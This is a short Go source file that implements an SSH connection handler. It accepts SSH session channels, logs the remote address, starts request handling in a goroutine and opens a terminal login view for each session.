package masters

import (
	"Nosviak3/source/masters/sessions"
	"Nosviak3/source/masters/terminal"
	"Nosviak3/source/masters/views"
	"log"
	"net"

	"golang.org/x/crypto/ssh"
)

/*
	Handles the current know TCP connections state into the
	SSH handler and tries to comminucate within the encrypted
	tunnel which SSH offers
*/

// HandleConnection allows the connection to be established and handled as SSH
func HandleConnection(server *ssh.ServerConfig, config *Config, established net.Conn) error {
	conn, channels, DeferRequests, err := ssh.NewServerConn(established, server)
	if err != nil {
		return err
	}

	defer established.Close()
	for target := range channels {
		if target.ChannelType() != "session" {
			return target.Reject(ssh.UnknownChannelType, "UnknownChannelType")
		}

		channel, request, err := target.Accept()
		if err != nil {
			return err
		}

		log.Printf("SSH connection established and confirmed from %s", conn.RemoteAddr().String())

		/* Attempts to handle the entire incoming connection by init a new terminal then handling requests inside thread and opening login function */
		term := terminal.NewTerminal(channel, conn)
		go Requests(request, DeferRequests, term)

		/* Executes the login screen then removes the channel once finished  */
		views.Login(term)
		sessions.RemoveSessionViaChannel(channel)
	}

	return nil 
}